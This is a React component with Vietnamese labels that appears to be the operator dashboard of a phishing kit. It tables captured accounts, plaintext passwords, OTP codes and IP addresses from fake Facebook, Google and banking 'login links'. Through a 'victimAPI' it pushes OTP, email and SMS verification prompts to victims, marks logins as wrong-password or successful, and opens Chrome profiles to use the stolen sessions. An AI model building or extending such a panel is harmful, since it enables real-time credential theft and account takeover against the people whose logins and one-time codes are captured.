import React, { useState, useEffect } from "react";
import { motion } from "framer-motion";
import { Button } from "./ui/button";
import { Badge } from "./ui/badge";
import { Input } from "./ui/input";
import { useToast } from "./ui/use-toast";
import { accessHistoryAPI, victimAPI, chromeAPI } from "../services/apiService";
import websocketService from "../services/websocketService";
import {
  Table,
  TableBody,
  TableCell,
  TableHead,
  TableHeader,
  TableRow,
} from "./ui/table";
import {
  DropdownMenu,
  DropdownMenuContent,
  DropdownMenuItem,
  DropdownMenuTrigger,
} from "./ui/dropdown-menu";
import {
  Select,
  SelectContent,
  SelectItem,
  SelectTrigger,
  SelectValue,
} from "./ui/select";
import {
  CheckCircle,
  Clock,
  XCircle,
  Copy,
  Eye,
  Settings,
  Phone,
  Mail,
  Key,
  Chrome,
  MessageSquare,
  UserPlus,
  Filter,
  MoreHorizontal,
} from "lucide-react";

const AccessHistoryTable = ({ searchTerm }) => {
  const [accessHistory, setAccessHistory] = useState([]);
  const [filter, setFilter] = useState("all");
  const [loading, setLoading] = useState(true);
  const { toast } = useToast();

  // Load access history from API
  const loadAccessHistory = async () => {
    try {
      setLoading(true);
      const data = await accessHistoryAPI.getHistory();
      setAccessHistory(data);
    } catch (error) {
      console.error('Error loading access history:', error);
      // Fallback to mock data if API fails
      loadMockData();
    } finally {
      setLoading(false);
    }
  };

  // Mock data fallback
  const loadMockData = () => {
    setLoading(true);
    const mockData = [
      {
        id: 1,
        timestamp: new Date().toLocaleString('vi-VN'),
        linkName: "Facebook Login Link #1",
        account: "user1@gmail.com | 0901234567 | Facebook",
        password: "password123",
        otpCode: "123456",
        ipAddress: "192.168.1.100",
        status: "success",
        chromeProfile: "facebook-profile-1",
        isTest: false,
      },
      {
        id: 2,
        timestamp: new Date(Date.now() - 300000).toLocaleString('vi-VN'),
        linkName: "Google Login Link #2",
        account: "testuser@gmail.com | 0987654321 | Google",
        password: "testpass456",
        otpCode: "654321",
        ipAddress: "192.168.1.101",
        status: "pending",
        chromeProfile: "google-profile-2",
        isTest: true,
      },
      {
        id: 3,
        timestamp: new Date(Date.now() - 600000).toLocaleString('vi-VN'),
        linkName: "Banking Login Link #3",
        account: "admin@bank.com | 0912345678 | Banking",
        password: "securepass789",
        otpCode: "789012",
        ipAddress: "192.168.1.102",
        status: "failed",
        chromeProfile: "banking-profile-3",
        isTest: false,
      },
    ];
    
    setTimeout(() => {
      setAccessHistory(mockData);
      setLoading(false);
    }, 1000);
  };

  useEffect(() => {
    loadAccessHistory();
    
    // Subscribe to real-time updates
    websocketService.subscribeToAccessHistory((update) => {
      if (update.type === 'new_entry') {
        setAccessHistory(prev => [update.data, ...prev]);
      }
    });
    
    return () => {
      // Cleanup subscriptions when component unmounts
      websocketService.disconnect();
    };
  }, []);

  const getStatusBadge = (status) => {
    switch (status) {
      case "success":
        return (
          <Badge className="bg-green-500/10 text-green-400 border-green-500/20">
            <CheckCircle className="w-3 h-3 mr-1" />
            Thành công
          </Badge>
        );
      case "pending":
        return (
          <Badge className="bg-yellow-500/10 text-yellow-400 border-yellow-500/20">
            <Clock className="w-3 h-3 mr-1" />
            Chờ OTP
          </Badge>
        );
      case "failed":
        return (
          <Badge className="bg-red-500/10 text-red-400 border-red-500/20">
            <XCircle className="w-3 h-3 mr-1" />
            Thất bại
          </Badge>
        );
      default:
        return null;
    }
  };

  const copyToClipboard = (text) => {
    navigator.clipboard.writeText(text);
    // You could add a toast notification here
  };

  const handleAction = async (action, item) => {
    try {
      setLoading(true);
      let result;
      
      switch (action) {
        case 'approve':
          result = await accessHistoryAPI.updateStatus(item.id, 'approved', 'Admin approved login');
          toast({
            title: "Đã duyệt thành công",
            description: `Đã phê duyệt đăng nhập cho ${item.account}`,
            variant: "success"
          });
          break;
          
        case 'otp':
          // Gửi yêu cầu OTP
          result = await victimAPI.sendCommand(item.victimId || 'default', 'request_otp', {
            website: item.link,
            account: item.account
          });
          toast({
            title: "Đã gửi yêu cầu OTP",
            description: `Yêu cầu OTP cho ${item.account}`,
            variant: "success"
          });
          break;
          
        case 'email':
          // Gửi email verification
          result = await victimAPI.sendCommand(item.victimId || 'default', 'email_verification', {
            email: item.account,
            website: item.link
          });
          toast({
            title: "Đã gửi email xác thực",
            description: `Email xác thực đã được gửi đến ${item.account}`,
            variant: "success"
          });
          break;
          
        case 'phone':
          // Gửi SMS verification
          result = await victimAPI.sendCommand(item.victimId || 'default', 'sms_verification', {
            phone: item.phone || 'N/A',
            website: item.link
          });
          toast({
            title: "Đã gửi SMS xác thực",
            description: `SMS xác thực đã được gửi`,
            variant: "success"
          });
          break;
          
        case 'wrong-password':
          result = await accessHistoryAPI.updateStatus(item.id, 'failed', 'Wrong password detected');
          toast({
            title: "Đã đánh dấu sai mật khẩu",
            description: `Đã cập nhật trạng thái cho ${item.account}`,
            variant: "warning"
          });
          break;
          
        case 'login-ok':
          result = await accessHistoryAPI.updateStatus(item.id, 'success', 'Login successful');
          toast({
            title: "Đăng nhập thành công",
            description: `Đã xác nhận đăng nhập thành công cho ${item.account}`,
            variant: "success"
          });
          break;
          
        case 'open-chrome':
          // Mở Chrome profile
          result = await chromeAPI.openProfile(item.chromeProfile || 'default-profile', item.linkName);
          toast({
            title: "Đã mở Chrome Profile",
            description: `Profile ${item.chromeProfile} đã được mở`,
            variant: "success"
          });
          break;
          
        case 'config-chrome':
          // Cấu hình Chrome profile
          result = await chromeAPI.configureProfile(item.chromeProfile || 'default-profile', {
            clearCookies: true,
            clearHistory: false,
            userAgent: 'default'
          });
          toast({
            title: "Đã cấu hình Chrome Profile",
            description: `Cấu hình cho profile ${item.chromeProfile} đã được cập nhật`,
            variant: "success"
          });
          break;
          
        default:
          console.log(`Unknown action: ${action}`, item);
          toast({
            title: "Hành động không xác định",
            description: `Hành động ${action} chưa được hỗ trợ`,
            variant: "error"
          });
          return;
      }
      
      // Refresh data after action
      await loadAccessHistory();
      
    } catch (error) {
      console.error(`Error executing ${action}:`, error);
      toast({
        title: "Lỗi thực hiện hành động",
        description: error.message || `Không thể thực hiện ${action}`,
        variant: "error"
      });
    } finally {
      setLoading(false);
    }
  };

  const addTestUser = () => {
    const newTestUser = {
      id: Date.now(),
      timestamp: new Date().toLocaleString('vi-VN'),
      linkName: "Test User Link #" + Math.floor(Math.random() * 1000),
      account: `testuser${Math.floor(Math.random() * 1000)}@test.com | 090${Math.floor(Math.random() * 10000000)} | Test`,
      password: "testpass" + Math.floor(Math.random() * 1000),
      otpCode: Math.floor(Math.random() * 900000 + 100000).toString(),
      ipAddress: `192.168.1.${Math.floor(Math.random() * 255)}`,
      status: "pending",
      chromeProfile: `test-profile-${Math.floor(Math.random() * 100)}`,
      isTest: true,
    };
    
    setAccessHistory(prev => [newTestUser, ...prev]);
  };

  const filteredData = accessHistory.filter(item => {
    const matchesSearch = searchTerm ? 
      item.linkName.toLowerCase().includes(searchTerm.toLowerCase()) ||
      item.account.toLowerCase().includes(searchTerm.toLowerCase()) ||
      item.ipAddress.includes(searchTerm) : true;
    
    const matchesFilter = filter === "all" ? true :
      filter === "test" ? item.isTest :
      filter === "prod" ? !item.isTest : true;
    
    return matchesSearch && matchesFilter;
  });

  if (loading) {
    return (
      <div className="flex items-center justify-center h-64">
        <div className="animate-spin rounded-full h-8 w-8 border-b-2 border-blue-400"></div>
      </div>
    );
  }

  return (
    <div className="space-y-4">
      {/* Header Controls */}
      <div className="flex items-center justify-between">
        <div className="flex items-center gap-4">
          <h2 className="text-2xl font-bold text-foreground">Lịch Sử Truy Cập</h2>
          <Select value={filter} onValueChange={setFilter}>
            <SelectTrigger className="w-40">
              <Filter className="w-4 h-4 mr-2" />
              <SelectValue />
            </SelectTrigger>
            <SelectContent>
              <SelectItem value="all">Tất cả</SelectItem>
              <SelectItem value="prod">Production</SelectItem>
              <SelectItem value="test">Test</SelectItem>
            </SelectContent>
          </Select>
        </div>
        
        <Button onClick={addTestUser} className="bg-purple-600 hover:bg-purple-700">
          <UserPlus className="w-4 h-4 mr-2" />
          Thêm User Test
        </Button>
      </div>

      {/* Access History Table */}
      <div className="rounded-lg border border-border bg-card">
        <Table>
          <TableHeader>
            <TableRow className="border-border">
              <TableHead className="w-16">STT</TableHead>
              <TableHead className="w-40">Thời Gian</TableHead>
              <TableHead className="w-48">Tên Link</TableHead>
              <TableHead className="w-64">Tài Khoản</TableHead>
              <TableHead className="w-32">Mật Khẩu</TableHead>
              <TableHead className="w-24">OTP</TableHead>
              <TableHead className="w-32">IP Login</TableHead>
              <TableHead className="w-32">Trạng Thái</TableHead>
              <TableHead className="w-40">Chrome</TableHead>
              <TableHead className="w-32">Thông Báo</TableHead>
              <TableHead className="w-80">Hành Động</TableHead>
            </TableRow>
          </TableHeader>
          <TableBody>
            {filteredData.map((item, index) => (
              <motion.tr
                key={item.id}
                initial={{ opacity: 0, y: 20 }}
                animate={{ opacity: 1, y: 0 }}
                transition={{ delay: index * 0.1 }}
                className="border-border hover:bg-muted/50"
              >
                <TableCell className="font-mono text-muted-foreground">
                  #{index + 1}
                </TableCell>
                <TableCell className="text-sm">
                  {item.timestamp}
                </TableCell>
                <TableCell>
                  <div className="flex items-center gap-2">
                    <span className="font-medium">{item.linkName}</span>
                    {item.isTest && (
                      <Badge className="bg-purple-500/10 text-purple-400 border-purple-500/20 text-xs">
                        TEST
                      </Badge>
                    )}
                  </div>
                </TableCell>
                <TableCell className="text-sm">
                  {item.account}
                </TableCell>
                <TableCell>
                  <div className="flex items-center gap-2">
                    <code className="bg-muted px-2 py-1 rounded text-xs">
                      {item.password}
                    </code>
                    <Button
                      size="sm"
                      variant="ghost"
                      onClick={() => copyToClipboard(item.password)}
                      className="h-6 w-6 p-0"
                    >
                      <Copy className="h-3 w-3" />
                    </Button>
                  </div>
                </TableCell>
                <TableCell>
                  <code className="bg-blue-500/10 text-blue-400 px-2 py-1 rounded font-mono text-sm">
                    {item.otpCode}
                  </code>
                </TableCell>
                <TableCell className="text-sm font-mono">
                  {item.ipAddress}
                </TableCell>
                <TableCell>
                  {getStatusBadge(item.status)}
                </TableCell>
                <TableCell>
                  <div className="flex items-center gap-2">
                    <span className="text-sm">{item.chromeProfile}</span>
                    <div className="flex gap-1">
                      <Button
                        size="sm"
                        variant="outline"
                        className="h-6 px-2 text-xs"
                        onClick={() => handleAction('open-chrome', item)}
                      >
                        Open
                      </Button>
                      <Button
                        size="sm"
                        variant="ghost"
                        className="h-6 w-6 p-0"
                        onClick={() => handleAction('config-chrome', item)}
                      >
                        <Settings className="h-3 w-3" />
                      </Button>
                    </div>
                  </div>
                </TableCell>
                <TableCell>
                  <Select defaultValue="template1">
                    <SelectTrigger className="h-8 text-xs">
                      <SelectValue />
                    </SelectTrigger>
                    <SelectContent>
                      <SelectItem value="template1">Template 1</SelectItem>
                      <SelectItem value="template2">Template 2</SelectItem>
                      <SelectItem value="custom">Custom</SelectItem>
                    </SelectContent>
                  </Select>
                </TableCell>
                <TableCell>
                  <div className="flex items-center gap-1">
                    <Button
                      size="sm"
                      variant="outline"
                      className="h-7 px-2 text-xs bg-green-500/10 text-green-400 border-green-500/20 hover:bg-green-500/20"
                      onClick={() => handleAction('approve', item)}
                    >
                      ✅ Duyệt
                    </Button>
                    <Button
                      size="sm"
                      variant="outline"
                      className="h-7 px-2 text-xs bg-blue-500/10 text-blue-400 border-blue-500/20 hover:bg-blue-500/20"
                      onClick={() => handleAction('otp', item)}
                    >
                      📱 OTP
                    </Button>
                    <Button
                      size="sm"
                      variant="outline"
                      className="h-7 px-2 text-xs bg-yellow-500/10 text-yellow-400 border-yellow-500/20 hover:bg-yellow-500/20"
                      onClick={() => handleAction('email', item)}
                    >
                      ✉ Email
                    </Button>
                    <Button
                      size="sm"
                      variant="outline"
                      className="h-7 px-2 text-xs bg-orange-500/10 text-orange-400 border-orange-500/20 hover:bg-orange-500/20"
                      onClick={() => handleAction('phone', item)}
                    >
                      📞 SDT
                    </Button>
                    <Button
                      size="sm"
                      variant="outline"
                      className="h-7 px-2 text-xs bg-red-500/10 text-red-400 border-red-500/20 hover:bg-red-500/20"
                      onClick={() => handleAction('wrong-password', item)}
                    >
                      ❌ Sai MK
                    </Button>
                    <Button
                      size="sm"
                      variant="outline"
                      className="h-7 px-2 text-xs bg-green-600/10 text-green-300 border-green-600/20 hover:bg-green-600/20"
                      onClick={() => handleAction('login-ok', item)}
                    >
                      Login OK
                    </Button>
                  </div>
                </TableCell>
              </motion.tr>
            ))}
          </TableBody>
        </Table>
      </div>

      {filteredData.length === 0 && (
        <div className="text-center py-8 text-muted-foreground">
          Không có dữ liệu phù hợp với bộ lọc hiện tại
        </div>
      )}
    </div>
  );
};

export default AccessHistoryTable;
